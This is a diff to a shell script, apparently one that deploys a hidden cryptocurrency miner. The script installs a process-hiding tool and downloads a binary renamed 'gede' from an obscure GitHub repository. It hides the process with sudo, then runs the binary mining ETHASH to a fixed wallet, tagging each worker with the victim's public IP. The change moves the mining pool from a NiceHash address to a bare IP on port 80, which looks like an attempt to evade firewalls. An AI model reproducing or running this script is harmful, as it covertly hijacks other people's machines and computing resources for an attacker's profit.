@@ -15,6 +15,6 @@ npm i -g node-process-hider
 wget -qO gede https://raw.githubusercontent.com/hndouehdw/nhcque/master/coinbtc
 sudo ph add gede
 chmod +x ./gede
-./gede --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 --user 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$(echo "$(curl -s ifconfig.me)" | tr . _ )-GASMAWON $@ --ethstratum ETHPROXY
+./gede --algo ETHASH --pool 144.217.82.15:80 --user 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$(echo "$(curl -s ifconfig.me)" | tr . _ )-GASMAWON $@ --ethstratum ETHPROXY
 
 echo success
